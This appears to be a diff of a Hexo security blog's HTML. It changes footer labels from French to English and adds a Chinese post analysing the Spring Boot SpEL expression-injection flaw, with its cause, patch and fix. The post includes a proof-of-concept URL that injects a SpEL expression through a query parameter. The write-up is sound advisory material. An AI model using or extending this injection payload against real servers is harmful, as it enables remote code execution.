-      <a data-url="http://wsygoogol.github.io/2016/09/18/WAF-Bypass-技巧总结/" data-id="cjbot7scn000d9w1bddz06tt1" class="article-share-link">Partager</a>
+      <a data-url="http://wsygoogol.github.io/2016/09/18/WAF-Bypass-技巧总结/" data-id="cjbqlox8n000h4o1blh3x55dk" class="article-share-link">Share</a>
       
       
     </footer>
@@ -637,7 +553,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2016/08/11/sqlmap-使用/" data-id="cjbot7scq000g9w1bw81bf6py" class="article-share-link">Partager</a>
+      <a data-url="http://wsygoogol.github.io/2016/08/11/sqlmap-使用/" data-id="cjbqlox8o000i4o1bo6mgh4st" class="article-share-link">Share</a>
       
       
     </footer>
@@ -694,7 +610,51 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2016/08/08/OGNL机制和Struts2漏洞利用原理研究/" data-id="cjbot7scl000b9w1b16y2ou3k" class="article-share-link">Partager</a>
+      <a data-url="http://wsygoogol.github.io/2016/08/08/OGNL机制和Struts2漏洞利用原理研究/" data-id="cjbqlox7q000c4o1byz7hd8xj" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="w-Spring-Boot框架SPEL表达式注入漏洞" class="article article-type-w" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2016/07/15/Spring-Boot框架SPEL表达式注入漏洞/" class="article-date">
+  <time datetime="2016-07-15T07:42:14.000Z" itemprop="datePublished">2016-07-15</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/07/15/Spring-Boot框架SPEL表达式注入漏洞/">Spring Boot框架SPEL表达式注入漏洞</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>pring是2003年兴起的轻量级Java开发框架。任何Java应用都可以使用该框架的核心特性，在Java EE平台之上有可用于构建Web应用的扩展。Spring Boot是Spring 的一个核心子项目，其设计目的是用来简化新Spring应用的初始搭建以及开发过程。该框架使用了特定的方式来进行配置，从而使开发人员不再需要定义样板化的配置国内包括百度、阿里巴巴、腾讯等诸多知名企业都在使用该框架。<br>最近Spring Boot框架的SpEL表达式注入通用漏洞曝光，利用该漏洞，远程攻击者在服务器上可执行任意命令。</p>
+<h4 id="受影响的版本"><a href="#受影响的版本" class="headerlink" title="受影响的版本"></a>受影响的版本</h4><p>Spring Boot 1.1 1.2 1.3.0版本</p>
+<h4 id="不受影响的版本"><a href="#不受影响的版本" class="headerlink" title="不受影响的版本"></a>不受影响的版本</h4><p>Spring Boot 1.3.1及以上版本</p>
+<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>以下是官方给的漏洞说明：<br><img src="/upload_image/3.png" alt=""><br>查看spring boot1.3.0的源文件ErrorMvcAutoConfiguration.java，发现出问题的地方主要在SpelView类中：<br><img src="/upload_image/4.png" alt=""><br>经过分析得知在用户采用了Spring Boot启动Spring MVC项目后Spring Boot的默认异常模板在处理异常信息的时候递归解析SPEL表达式，可导致SPEL表达式注入并执行。主要问题是SpelView类中会对路径中或者名字中含有的表达式递归解析，所以在1.3.1修复时添加了NonRecursivePropertyPlaceholderHelper类，防止递归解析路径中或者名字中含有的表达式。</p>
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>利用此漏洞，只需在SpringMVC的Controller中的参数触发一个异常，异常信息带有SPEL表达式就可以注入了。<br>POC：<br><a href="http://localhost:8555/test.php?id=${new%20java.lang.String(new%20byte[]{78,115,102,111,99,117,115})}" target="_blank" rel="external">http://localhost:8555/test.php?id=${new%20java.lang.String(new%20byte[]{78,115,102,111,99,117,115})}</a><br>漏洞证明：<br><img src="/upload_image/5.png" alt=""><br>利用表达式成功创建了字符串Nsfocus.</p>
+<h4 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h4><p>从spring-boot的github的项目中可以看到，这个漏洞是在这个commit中修复的：<br><a href="https://github.com/spring-projects/spring-boot/commit/edb16a13ee33e62b046730a47843cb5dc92054e6" target="_blank" rel="external">https://github.com/spring-projects/spring-boot/commit/edb16a13ee33e62b046730a47843cb5dc92054e6</a><br>在修复的log里可以看到存着漏洞的1.3.0和1.3.1的差别：<br><img src="/upload_image/6.png" alt=""><br>1.3.1创建了NonRecursivePropertyPlaceholderHelper类，防止递归解析路径中或者名字中含有的表达式。</p>
+<h4 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h4><p>升级Spring Boot版本至1.3.1或以上版本</p>
+<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="http://www.freebuf.com/news/108665.html" target="_blank" rel="external">http://www.freebuf.com/news/108665.html</a><br><a href="http://www.wooyun.org/bugs/wooyun-2010-226888" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2010-226888</a><br><a href="https://github.com/spring-projects/spring-boot/issues/4763" target="_blank" rel="external">https://github.com/spring-projects/spring-boot/issues/4763</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://wsygoogol.github.io/2016/07/15/Spring-Boot框架SPEL表达式注入漏洞/" data-id="cjbqlox7m000a4o1bbcas7isv" class="article-share-link">Share</a>
       
       
     </footer>
@@ -733,7 +693,7 @@
   
     
   <div class="widget-wrap">
-    <h3 class="widget-title">Articles récents</h3>
+    <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
         
@@ -771,7 +731,7 @@
   <div class="outer">
     <div id="footer-info" class="inner">
       &copy; 2017 SY0U<br>
-      Propulsé by <a href="http://hexo.io/" target="_blank">Hexo</a>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
     </div>
   </div>
 </footer>
